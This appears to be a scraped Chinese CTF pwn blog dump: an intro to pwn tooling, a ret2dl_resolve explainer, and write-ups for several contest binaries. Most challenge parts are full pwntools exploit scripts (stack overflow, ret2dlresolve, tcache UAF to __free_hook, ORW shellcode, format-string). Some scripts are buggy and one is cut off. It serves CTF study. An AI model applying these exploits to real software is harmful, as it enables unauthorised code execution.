3.数据结构与操作系统。CTF中的Pwn题一般涉及栈溢出、堆溢出等漏洞，要求解题者对数据结构有比较深的理解。同时，由于Pwn靶机一般是Linux系统的靶机，二进制文件也在Linux环境下编译运行，因此，学会熟练使用、深入理解Linux系统是每个Pwn解题者的必修课。学Pwn需要有的心理准备    1.自学拉满：本队伍没有强Pwn手，手把手教学什么的应该没有。Pwn涉及的计算机底层知识较多，需要你深入学习并理解。    2.坐牢准备：Pwn所需的前置知识比较多，0基础入门者可能很久都解不了什么题    3.做好准备跟真正的爷爷竞争。\n真.入门之环境配置如果你准备好踏入Pwn的大门，我们先从环境配置开始吧    https://mirrors.tuna.tsinghua.edu.cn/    在这里找个纯净的Ubuntu镜像文件，18.04到22.04之间的都可以（建议不要用kali，用来做过渡可以，但是会有些问题；22.04以上太新，也会有问题。存储空间富有者当我没说），先搭建起自己的虚拟机吧。    这里说说原因哈，python的pwntools在Windows环境下运行会有些问题，此外当你自己研究时也需要用到Linux环境。    https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/看这里换源更新\nsudo apt update &amp;&amp;sudo apt upgrade -ysudo apt install python3\n（ps：以下安装过程中会下载所需的依赖，比较吃网络环境，如果不成功可以多试几次）装pip\nsudo apt install pip\n装pwntools，这个库非常有用，是你的左膀右臂（很重要，最好有时间能精读它的手册）\npip install pwntools\n装git，这个用来下github上的东西\nsudo apt install git\n装pwndbg，这个是gdb的插件，在调试方面能给你很大帮助（调试方法请自学，很重要）先装四个库不然会报错（主要是linux下64位和32位的环境）\nsudo apt-get install libffi-devsudo apt-get install libssl-devsudo apt install libc6-dev-i386sudo apt-get install lib32z1cd Desktopgit clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.shcd ..\n装ROPgadget，这个工具能帮你找到二进制文件中可用的gadget，也可以直接对静态编译的二进制文件生成ROP链\nsudo apt-get install python-capstonegit clone https://github.com/JonathanSalwan/ROPgadget.gitcd ROPgadgetsudo -H python3 setup.py install\none_gadget，这个工具能帮你找到一些危险的可以加以利用的汇编片段\nsudo apt-get install ruby ruby-devsudo gem install one_gadget\nseccomp-tools,这个工具是查sandbox用的\nsudo apt install gcc ruby-devgem install seccomp-tools\n真.入门之一道pwn题以下是一道pwn题，不是最简单的，但是很好地展现了pwn手解题的过程，因此放在这里【HDCTF2023】pwnner考点：已知种子随机数预测+简单栈溢出覆盖返回地址查个保护先\n┌──(str1d3r㉿str1k3Gwindows)-[~/Desktop]└─$ checksec pwnner[*] &#x27;/Desktop/pwnner&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)```  开了NX，不能直接在栈上执行shellcode（各类保护是需要知道的）进IDA，看vuln函数，F5反编译，发现需要经过一次输入随机数的判断才能到达漏洞执行处，由于程序给了随机数种子（伪随机），我们可以通过直接在本地生成一个随机数来通过验证，到达漏洞所在处完成利用```c__int64 vuln()&#123;  int v0; // ebx  char buf[16]; // [rsp+0h] [rbp-50h] BYREF  char v3[64]; // [rsp+10h] [rbp-40h] BYREF  srand(0x39u); //种子为0x39的随机数生成  puts(&quot;you should prove that you love pwn,so input your name:&quot;);  read(0, buf, 0x10uLL); //存在溢出  v0 = atoi(buf);  if ( v0 == rand() )  &#123;    puts(&quot;ok,you have a little cognition about pwn,so what will you do next?&quot;);    read(0, v3, 0x100uLL);  &#125;  else  &#123;    puts(&quot;sorry,you are not a real pwnner&quot;);  &#125;  return 0LL;&#125;\n又发现：getshell函数内直接有system(‘&#x2F;bin&#x2F;sh’),所以思路如下先通过随机数预测，再利用溢出点覆盖函数返回地址，跳到getshell函数成功getshell随机数预测脚本：\n#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;time.h&gt;int main()&#123;                srand(0x39u);        int v4 = rand();        printf(&quot;%d, &quot;,v4);&#125;\n注意的是因为靶机也是Linux系统，所以该脚本需要由Linux系统编译运行直接贴脚本\nfrom pwn import*       #引入pwntools库elf=ELF(&#x27;./pwnner&#x27;)  context.log_level = &#x27;debug&#x27; #这个能看到回显p = remote(&#x27;node1.anna.nssctf.cn&#x27;,28090)#链接靶机p.recvuntil(&#x27;you should prove that you love pwn,so input your name:&#x27;)p.send(b&#x27;1956681178&#x27;) #通过随机数检验payload = b&#x27;a&#x27;*64+b&#x27;b&#x27;*8+p64(0x4008b2)#填充垃圾数据，覆盖8位的返回地址，再跳转到getshell函数获得shellp.send(payload)    #发送payloadp.interactive()    #交互\n成功拿到shell\n","categories":["basic"],"tags":["Linux"]},{"title":"ret2dl_resolve","url":"/2023/12/06/ret2dl-resolve/","content":"适用于无法leak信息的栈溢出动态装载器负贵将二进制文件及依赖库加载到内存，该过程包含了对导入符号（函数和全局变量）的解析。每个符号都是一个Elf_Sym结构体的实例，这些符号又共同组成了.dynsym段。Elf_Sym结构体如下所示。\n/*Symbol table entry.*/typedef struct&#123;    Elf32_Word      st name;/*Symbol name (string tbl index)*/    Elf32_Addr      st_value;/*Symbol value*/    Elf32_Word      st_size;/*Symbol size*/    unsigned char   st info;/*Symbol type and binding */    unsigned char   st_other;/*Symbol visibility*/    Elf32_Section   st shndx;/*Section index*/&#125;Elf32_Sym;/*How to extract and insert information held in the st info field.*/#define ELF32_ST_BIND(val)      (((unsigned char)(val))&gt;&gt;4)#define ELF32_ST_TYPE(val)      ((va1)&amp;0xf)#define ELF32_ST_INFO(bind,type)((bind) &lt;&lt; 4)+((type) &amp;0xf)\n其中st_name域是相对于.dynstr段的偏移，保存符号名字符串；st_value域是当符号被导出时用于存放虚拟地址的，不导出时则为NULL。\n导入符号的解析需要进行重定位，每个重定位项都是一个ELF_Rel结构体的实例这些项又共同组成了.rl.plt段（用于导入函数）和.rel.dyn段（用于导入全局变量）。Elf_Rel结构体如下所示。\n/*Relocation table entry without addend (in section of type SHT_REL).*/typedef struct&#123;    Elf32_Addr r_offset;/*Address*/    Elf32_Word r_info;/*Relocation type and symbol index*/&#125; Elf32_Rel;/*How to extract and insert information held in the r info field.*/#define ELF32_R_SYM(val)        ((val)&gt;&gt;8)#define ELF32_R_TYPE(val)       ((val)&amp; Oxff)#define ELF32_R_INFO(sym,type)  (((sym)&lt;&lt;8)((type)&amp;0xff))\n其中r_offset.域用于保存解析后的符号地址写入内存的位置（绝对地址），rinfo域的高位3个字节用于标识该符号在.dynsym段中的位置（无符号下标）。\n因此，当程序导入一个函数时，动态链接器会同时在.dynstr段中添加一个函数名字符串，在.dynsym段中添加一个指向函数名字符串的EIf_Sym,在.rel.plt段中添加一个指向EIf_Sym的Elf_Rel。最后，这些Elf_Rel的r_offset域又构成了GOT表，保存在.got.plt段中。由于引入了延迟绑定机制，符号的解析只有在第一次使用的时候才进行，该过程是通过PLT表进行的。每个导入函数都在PLT表中有一个条目，其第1条指令无条件跳转到对应G0T条目保存的地址处。而每个GOT条目在初始化时都默认指向对应PLT条目的第2条指令的位置，相当于又跳回来了。此时继续执行PLT的后两条指令，先将导入函数的标识(Elf_Rel在.rel.plt段中的偏移)压栈，然后跳转到PLT0执行。PLT0包含两条指令，先将GOT[1]的值（一个link_map对象的地址）压栈，然后跳转到GOT[2]保存到地址处也就是_dl_runtime_resolve()函数。函数参数link_map_obj用于获取解析导入函数所需的信息，参数reloc_.indox则标识了解析哪一个导入函数。解析完成后，相应的GOT条目会被修改为正确的函数地址，此后程序再调用该函数时就不需要再次进行解析了。\n在i386下，_dl_runtime_resolve()由汇编实现，如下\n其中，_dl_fixup()函数在&#x2F;elf&#x2F;dl-runtime.c中实现，用于解析导入函数的真实地址，并改写GOT,如下注意，这里是glibc2.31的实现\nDL_FIXUP_VALUE_TYPEattribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS\t   ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif\t   struct link_map *l, ElfW(Word) reloc_arg)&#123;  const ElfW(Sym) *const symtab    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);  const PLTREL *const reloc    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  const ElfW(Sym) *refsym = sym;  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);//对应got表地址  lookup_t result;  DL_FIXUP_VALUE_TYPE value;  /* Sanity check that we&#x27;re really looking at a PLT relocation.  */  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);//检查   /* Look up the target symbol.  If the normal lookup rules are not      used don&#x27;t look in the global scope.  */  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)    &#123;      const struct r_found_version *version = NULL;      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)\t&#123;\t  const ElfW(Half) *vernum =\t    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);\t  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;\t  version = &amp;l-&gt;l_versions[ndx];\t  if (version-&gt;hash == 0)\t    version = NULL;\t&#125;      /* We need to keep the scope around so do some locking.  This is\t not necessary for objects which cannot be unloaded or when\t we are not using any threads (yet).  */      int flags = DL_LOOKUP_ADD_DEPENDENCY;      if (!RTLD_SINGLE_THREAD_P)\t&#123;\t  THREAD_GSCOPE_SET_FLAG ();\t  flags |= DL_LOOKUP_GSCOPE_LOCK;\t&#125;#ifdef RTLD_ENABLE_FOREIGN_CALL      RTLD_ENABLE_FOREIGN_CALL;#endif      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,\t\t\t\t    version, ELF_RTYPE_CLASS_PLT, flags, NULL);//找到对应libc，返回指向libc_base的指针      /* We are done with the global scope.  */      if (!RTLD_SINGLE_THREAD_P)\tTHREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL      RTLD_FINALIZE_FOREIGN_CALL;#endif      /* Currently result contains the base load address (or link map)\t of the object that defines sym.  Now add in the symbol\t offset.  */      value = DL_FIXUP_MAKE_VALUE (result,\t\t\t\t   SYMBOL_ADDRESS (result, sym, false));//获得函数真实地址    &#125;  else    &#123;      /* We already found the symbol.  The module (and therefore its load\t address) is also known.  */      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));      result = l;    &#125;  /* And now perhaps the relocation addend.  */  value = elf_machine_plt_value (l, reloc, value);  if (sym != NULL      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  /* Finally, fix up the plt itself.  */  if (__glibc_unlikely (GLRO(dl_bind_not)))    return value;  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value); //写入got表&#125;\n\n此外，由于RELRO保护机制会影响延迟绑定，因此也会影响ret2dl-resolve:Partial RELRO:包括.dynamic段在内的一些段会被标识为只读。Full RELRO:在Partial RELRO的基础上，禁用延迟绑定，即所有的导入符号在加载时就被解析，.got.pt段被完全初始化为目标函数的地址，并标记为只读。\n(1)关闭RELRO保护，使.dynamic段可写时：由于动态装载器是从.dynamic.段的DT_STRTAB条目中来获取.dynstr段的地址，而DT_STRTAB的位置是己知的，且默认情况下可写，所以攻击者能够改写DT_STRTAB的内容，欺骗动态装载器，使它以为.dynstr.段在.bSs上，同时在那里伪造一个假的字符串表。当动态装载器尝试解析printf()时就会使用不同的基地址来寻找函数名，最终执行的是execve().(2)开启Partial RELRO保护，使.dynamic段不可写时：我们知道_dl_runtime_resolve()的第二个参数reloc_.index对应Elf_Rel在.rel.plt段中的偏移，动态装载器将其加上.rel.plt的基地址来得到目标Elf Rel的内存地址。然而，当这个内存地址超出了.rel.plt段，并最终落在.bss段中时，攻击者就可以在那里伪造一个Elf_Rel,使r_offset的值是一个可写的内存地址来将解析后的函数地址写在那里。同理，使rifo的值是一个能够将动态装载器导向到攻击者控制内存的下标，指向一个位于它后面的Elf_Sym,而Elf_Sym中的st_name指向它后面的函数名字符串。\n直接在题上复现过程[强网杯2021 no_output]checksec在程序运行前（执行第一次read前） 断点下到的位置就是read@plt,顺带可以看到dl_runtime_resolve的入口接下来走逆向部分这里打开了flag，同时将unk_804C080存在全局变量result。\nv3 = &quot;tell me some thing&quot;;read(0, buf, 0x30u);v3 = &quot;Tell me your name:\\n&quot;;read(0, src, 0x20u);  sub_80493EC(src);  strcpy(dest, src);  // strcpy 被 &#x27;\\x00&#x27; 截断，而且还会往 dest 后面补一个 &#x27;\\x00&#x27;v3 = &quot;now give you the flag\\n&quot;;read(unk_804C080, src, 0x10u);// off_804C034 存放的是字符串 &quot;hello_boy\\x00&quot;// check() 是字符串比较，两个字符串相同返回 0result = check(src, off_804C034); if ( !result )  result = sub_8049269();\n这里的strcpy存在一个类似于off-by-null的漏洞，会把unk_804C080覆盖为\\x00,因为dest后面就是unk_804C080，如下：导致后一个read实际执行read(unk_804C080,src,0x10),因此可以通过直接输入”hello_boy\\x00”来进入sub_8049269，如下此处 signal() 函数的作用在于：当发生除法异常时，执行 sub_8049236 函数，sub_8049236 函数中便是一个栈溢出了。由于 v1 不能为 0，我们令 v2 &#x3D; -2147483648, v1 &#x3D; -1，此时会发生除法溢出（int 类型的数据范围为：-2147483648 ~ 2147483647）。由于没有输出函数，用 ret2dlresolve 的方式来利用这个栈溢出漏洞。存两个模板吧ezdl\nfrom pwn import *context.log_level = &quot;debug&quot;elf = ELF(&#x27;./no_output&#x27;)p = process(&#x27;./no_output&#x27;)rop = ROP(&#x27;./no_output&#x27;)# 这里很奇怪，好像放别的字符串都不行...p.send(b&#x27;\\x00&#x27;)#gdb.attach(p)p.send(b&#x27;a&#x27;*0x20)p.send(b&#x27;hello_boy\\x00&#x27;)p.sendline(b&#x27;-2147483648&#x27;)p.sendline(b&#x27;-1&#x27;)dlresolve = Ret2dlresolvePayload(elf, symbol=&quot;system&quot;, args=[&quot;/bin/sh&quot;])print(dlresolve)rop.read(0, dlresolve.data_addr)rop.ret2dlresolve(dlresolve)raw_rop = rop.chain()info(rop.dump())# fit() 函数会自动填充，76 是溢出点，0x100 是 read() 函数的长度p.sendline(fit(&#123;76:raw_rop, 0x100:dlresolve.payload&#125;))p.interactive()\ndetail\nfrom pwn import *from pwn import p32challenge = &quot;./no_output&quot;context(arch = &quot;i386&quot;,log_level = &quot;debug&quot;,os = &quot;linux&quot;)p = process(&#x27;./no_output&#x27;)#libc = ELF(&quot;./libc.so.6&quot;)#r = remote(&quot;39.105.138.97&quot;,1234)elf = ELF(&#x27;./no_output&#x27;)leave_ret = 0x080491a5bss_stage = elf.bss() + 0x200success(&quot;bss : %s&quot;,hex(elf.bss()))fake_ebp = bss_stageoffset = 0x4c-8+8#read_plt  = elf.plt[&quot;read&quot;]#gdb.attach(r)p1 = b&quot;\\x00&quot; * 0x30p.send(p1)sleep(1)p.send(b&#x27;A&#x27; * 0x20)str1 = b&#x27;hello_boy&#x27;str1 = str1.ljust(0x10,b&#x27;\\x00&#x27;)p.send(str1)p.sendline(b&quot;-2147483648&quot;)p.sendline(b&quot;-1&quot;)sleep(0.1)read_plt = 0x80490C4ppp_ret = 0x08049581 # ROPgadget --binary test --only &quot;pop|ret&quot;pop_ebp_ret = 0x08049583leave_ret = 0x080491a5 # ROPgadget --binary test --only &quot;leave|ret&quot;stack_size = 0x800bss_addr = elf.bss() # readelf -S test | grep &quot;.bss&quot;base_stage = bss_addr + stack_sizepayload = flat(b&#x27;A&#x27; * offset, p32(read_plt), p32(ppp_ret), p32(0), p32(base_stage), p32(100), p32(pop_ebp_ret), p32(base_stage), p32(leave_ret))p.send(payload)cmd = &quot;/bin/sh&quot;plt_0 = 0x8049030 # objdump -d -j .plt testrel_plt = 0x8048414 # objdump -s -j .rel.plt testdynsym = 0x08048248  # readelf -S teststrtab = 0x08048318 #readelf -S testfake_write_addr = base_stage + 28fake_arg = fake_write_addr - rel_pltr_offset = elf.got[&#x27;read&#x27;]align = 0x10 - ((base_stage + 36 - dynsym) % 16) fake_sym_addr = base_stage + 36 + align # 填充地址使其与dynsym的偏移16字节对齐（即两者的差值能被16整除），因为结构体sym的大小都是16字节r_info = ((((fake_sym_addr - dynsym)//16) &lt;&lt; 8) | 0x7) # 使其最低位为7，通过检测fake_write_rel = flat(p32(r_offset), p32(r_info))fake_write_str_addr = base_stage + 36 + align + 0x10fake_name = fake_write_str_addr - strtabfake_sym = flat(p32(fake_name),p32(0),p32(0),p32(0x12))fake_write_str = &#x27;system\\x00&#x27;payload2 = flat(b&#x27;AAAA&#x27;, p32(plt_0), fake_arg, p32(ppp_ret), p32(base_stage + 80), p32(base_stage + 80), p32(len(cmd)), fake_write_rel # base_stage + 28, b&#x27;A&#x27; * align # 用于对齐的填充, fake_sym # base_stage + 36 + align, fake_write_str # 伪造出的字符串)payload2 += flat(&#x27;A&#x27; * (80-len(payload2)) , cmd + &#x27;\\x00&#x27;)payload2 += flat(&#x27;A&#x27; * (100-len(payload2)))#pause()p.send(payload2)p.interactive()\n","categories":["stack"],"tags":["rop"]},{"title":"the_Belt_and_Road_review","url":"/2023/10/24/the-Belt-and-Road-review/","content":"三个小时的理论+CTF，全打理论去了:(一带一路初赛题目附件orw_h1checksec\n└─$ checksec orw_h1[*] &#x27;/Desktop/pwn/orw_h1&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\nsandbox\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/fTF0Ly/orw_h1&#x27;  line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005 0004: 0x06 0x00 0x00 0x00000000  return KILL 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW\ndelete存在UAF\nif ( v1 &lt;= 0x1E &amp;&amp; *((_QWORD *)&amp;unk_202060 + (int)v1) )&#123;  free(*((void **)&amp;unk_202060 + (int)v1));  puts(&quot;delete done.&quot;);&#125;\nglibc2.27\nfrom pwn import *#from LibcSearcher import*from ctypes import *from struct import packfrom pwn import u64,p64context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)one_gadget=[0x4f2a5,0x4f302,0x10a2fc]p = process(&#x27;./orw_h1&#x27;)#p = remote(&#x27;106.15.38.114&#x27;, 32832)elf = ELF(&#x27;./orw_h1&#x27;)libc = ELF(&#x27;libc-2.27.so&#x27;)def debug():    gdb.attach(p)    pause()def add(size,idx):    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;description:&#x27;,str(size))    p.sendlineafter(b&#x27;Game description:&#x27;,str(idx))def delete(idx):    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;2&#x27;)    p.sendlineafter(b&#x27;game index: &#x27;,str(idx))def edit(idx1,idx2):    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;3&#x27;)    p.sendlineafter(b&#x27;game index: &#x27;,str(idx1))    p.sendlineafter(b&#x27;Game description:&#x27;,str(idx2))def show(idx):    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;4&#x27;)    p.sendlineafter(b&#x27;game index: &#x27;,str(idx))def exit():    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;5&#x27;)#先泄露libc地址add(0x80,&#x27;aaaa&#x27;) #1dx0add(0x130,&#x27;bbbb&#x27;) #idx1add(0x130,&#x27;bbbb&#x27;)#idx2for i in range(7):  add(128)for i in range(3, 10):  delete(i)delete(0)show(0)p.recv()libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) - 0x3ebca0free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]setcontext = libc_base + libc.sym[&#x27;setcontext&#x27;] + 53success(&quot;libc base:%s&quot;, hex(libc_base))success(&quot;setcontext_53:%s&quot;, hex(setcontext))success(&quot;free_hook:%s&quot;, hex(free_hook))#貌似gadgets找不齐，这里用官方wp的#打free_hook，利用setcontext开辟给shellcode的内存空间#来执行orw的shellcode#pop_rax_ret = libc_base+0x0000000000043ae8#pop_rdi_ret = libc_base+0x0000000000001193#pop_rsi_ret = libc_base+0x0000000000023eea#pop_rdx_ret = libc_base+0x0000000000001b96#ret = libc_base+0x0000000000000909#open1 = libc_base + libc.sym[&#x27;open&#x27;]#read = libc_base + libc.sym[&#x27;read&#x27;]#write = libc_base + libc.sym[&#x27;write&#x27;]#alarm = libc_base + libc.sym[&#x27;alarm&#x27;]#syscall = alarm+0x5#flag_addr = heap_base+0x2000newexe = free_hook &amp; 0xffffffffff000shellcode1 = &#x27;&#x27;&#x27;xor rdi,rdimov rsi,%dmov edx,0x1000mov eax,0syscalljmp rsi&#x27;&#x27;&#x27;% newexe#伪造setcontextframe = SigreturnFrame()framersp = free_hook+0x10frame.rdi = newexeframe.rsi = 0x1000frame.rdx = 7frame.rip = libc.sym[&#x27;mprotect&#x27;]#随意找的orwshellcode2= asm(&#x27;&#x27;&#x27; push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;)delete(1)edit(1, p64(free_hook))add(0x130)payload = p64(setcontext+53)+p64(free_hook+0x18)*2+asm(shellcode1)add(0x130, payload)edit(2, str(frame))delete(2)p.sendline(shellcode2)p.interactive()\n\npwn0402啥都没开\n└─$ checksec pwn0402[*] &#x27;/Desktop/pwn0402&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments\n\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v3; // edx  int v4; // ecx  int v5; // r8d  int v6; // r9d  char v8[132]; // [rsp+0h] [rbp-90h] BYREF  int v9; // [rsp+84h] [rbp-Ch]  int i; // [rsp+88h] [rbp-8h]  int j; // [rsp+8Ch] [rbp-4h]  init_0();  printf((unsigned int)&quot;secret: %p\\n&quot;, (unsigned int)v8, v3, v4, v5, v6, v8[0]);  length = read(0LL, v8, 296LL);//溢出  i = 0;  v9 = strlen(nosecurity_string);  for ( i = 0; i &lt; length; ++i )  &#123;    for ( j = 0; j &lt; v9; ++j )    &#123;      if ( nosecurity_string[j] == v8[i] )        exit(0LL);    &#125;  &#125;//检查，过滤了&#x27;CTctGFlagSNH/binsh&#x27;  return 0;&#125;\n根本不走检查:)\nfrom pwn import *#from LibcSearcher import*from ctypes import *from struct import packfrom pwn import u64,p64context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)p = process(&#x27;./pwn0402&#x27;)main = 0x400A05p.recvuntil(&#x27;secret: &#x27;)data = int(p.recvline(),16) #泄露溢出点位置rdx_rsi = 0x0000000000442b89 # pop rdx ; pop rsi ; retpop_rdi = 0x00000000004016e6gdb.attach(p,&#x27;b *0x0400ABF&#x27;)pause()success(&quot;v8:%s&quot;, hex(data))payload = b&#x27;&#x27;.ljust(0x98,b&#x27;\\x90&#x27;)#溢出payload += p64(rdx_rsi)payload += p64(0x100) + p64(data + 200)#== read (0,data+200,0x100)payload += p64(pop_rdi) payload += p64(0)payload += p64(0x0412ECB) #call_read p.sendline(payload)#gdb.attach(p)#pause()#现在调用read的rop链已经执行==现在再调用一次read#把shellcode写进去，整个栈都是可执行的p.sendline(p64(data+210)+b&#x27;\\x90&#x27;*20+asm(shellcraft.sh()))\n","categories":["wp"],"tags":["wp"]},{"title":"the_balt_and_road_final","url":"/2023/11/27/the-balt-and-road-final/","content":"抽象的赛制，业余的主办方一带一路决赛题目附件[pwn1]ez_pwn2checksec开了沙盒程序会把输入的东西读到栈上并执行比赛中把重点放到了溢出和直接写shellcode上，导致程序的跳转没拿捏住三个小时里做了很多无用功，后面又去看了下堆题（pwn2）没解出来赛后出\nfrom pwn import *from ctypes import *  context.arch=&#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;def debug():    gdb.attach(p)    pause()#p = remote(&quot;110.110.110.113&quot;,49201)main = 0x4009FCpop_rbp_ret = 0x4008c0pop_rdi_ret = 0x400b53ret = 0x400288leave_ret = 0x400999p = process(&quot;./ez_pwn2&quot;)elf = ELF(&quot;./ez_pwn2&quot;)p.recvuntil(b&#x27;shh:&#x27;)stack_addr = int(p.recv(18),16)success(&quot;stack: %s&quot;,hex(stack_addr))# 构造一个readshellcode1 = f&#x27;&#x27;&#x27;mov rsi,&#123;stack_addr&#125;mov rdx,0x200syscall&#x27;&#x27;&#x27;payload1 = asm(shellcode1)payload1 = payload1.ljust(0x28,b&#x27;A&#x27;)payload1 += p64(stack_addr)p.sendline(payload1)pause()# ORWshellcode2 = shellcraft.open(&#x27;/flag&#x27;)shellcode2+= shellcraft.read(3,&#x27;rsp&#x27;,0x40)shellcode2 += shellcraft.write(1,&#x27;rsp&#x27;,0x40)payload2 = len(payload1) * b&#x27;\\x90&#x27; + asm(shellcode1)p.sendline(payload2)p.interactive()\n\n[pwn2]drunk很常规的堆题打的时候nt没找到那个backdoor看来还得学一手修复\nfrom pwn import*p = remote(&#x27;110.110.110.113&#x27;,49211)#p = process(&quot;./drunk2&quot;)elf = ELF(&quot;./drunk2&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size,payload):    p.recvuntil(b&quot;--&gt;&gt;&gt;&gt; &quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;What size cup:&quot;)    p.sendline(str(size))#0 &lt;= malloc &lt; 0x40    p.recvuntil(b&quot;Do you want something to add?&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;--&gt;&gt;&gt;&gt; &quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;cup number: &#x27;)    p.sendline(str(index))#UAFdef edit(index,payload):    p.recvuntil(&quot;--&gt;&gt;&gt;&gt; &quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&quot;which cup:&quot;)    p.sendline(str(index))    p.recvuntil(b&quot;refill&quot;)    p.sendlineafter(b&quot;Now add something&quot;,payload)def show(index):    p.recvuntil(&quot;--&gt;&gt;&gt;&gt; &quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))def bd():    p.recvuntil(&#x27;--&gt;&gt;&gt;&gt; \\n&#x27;)    p.sendline(&#x27;888&#x27;)bd()add(0x38,&#x27;A&#x27;) # 0add(0x38,&#x27;B&#x27;) # 1delete(1)delete(0)show(0)heap_base = u64(data.ljust(8,b&#x27;\\x00&#x27;))(p.recv(6)) - 0x370edit(0,p64(heap_base + 0x10))pay = b&#x27;\\x00&#x27; * 0x0e + b&#x27;\\x07&#x27;add(0x38,&#x27;exp1&#x27;) # 2add(0x38,pay) # 3# exp 2add(0x38,&#x27;A&#x27;) # 4add(0x38,&#x27;B&#x27;) # 5delete(4)delete(5)edit(5,p64(heap_base + 0x2a0))add(0x38,&#x27;6&#x27;) # 6add(0x38,&#x27;7&#x27;) # 7delete(7)show(7)libc_base = uu64(r(6)) - 2018272__free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]success(&#x27;heap_base:%s&#x27;,heap_base)success(&#x27;libc_base:%s&#x27;,libc_base)add(0x38,&#x27;/bin/sh\\x00&#x27;) # 8add(0x38,&#x27;B&#x27;) # 9add(0x38,&#x27;/bin/sh\\x00&#x27;) # 8add(0x38,&#x27;B&#x27;) # 9delete(10)delete(11)edit(11,p64(__free_hook))add(0x38,&#x27;/bin/sh\\x00&#x27;) # 8add(0x38,p64(system)) # 9delete(7)p.interactive()","categories":["wp"],"tags":["wp"]},{"title":"qwb2023","url":"/2023/12/20/qwb2023/","content":"qwb_pwn附件下载，请注意为动态附件（应该pwn没影响吧）qwb2023_wp_written_by_Hor1zon强网先锋外啥也不会，明年再来\n[qwb2023 强网先锋-ez_fmt]checksec: vuln:gift会泄露栈顶地址，动调可以算出ret参数的地址格式化字符串漏洞任意地址写，可以劫持返回地址，利用printf函数泄露libc地址给了libc文件，直接尝试打one_gadget\nfrom pwn import *from pwn import p64def debug():    gdb.attach(p)    pause()#r=remote(&#x27;47.104.24.40&#x27;,1337)p=process(&#x27;./ez_fmt&#x27;)elf=ELF(&quot;./ez_fmt&quot;)libc=ELF(&quot;./libc-2.31.so&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;,log_level = &#x27;debug&#x27;)p.recvuntil(b&#x27;There is a gift for you &#x27;)stack_rsp=int(p.recv(14),16)#debug()#-----calc addrstack_printf_ret = stack_rsp - 0x8stack_ret = stack_rsp + 0x78stack_printf = stack_rsp + 0x158success(&#x27;stack_rsp: %s&#x27;,hex(stack_rsp))success(&#x27;stack_ret: %s&#x27;,hex(stack_ret))success(&#x27;stack_printf %s&#x27;,hex(stack_printf))ogg1 = 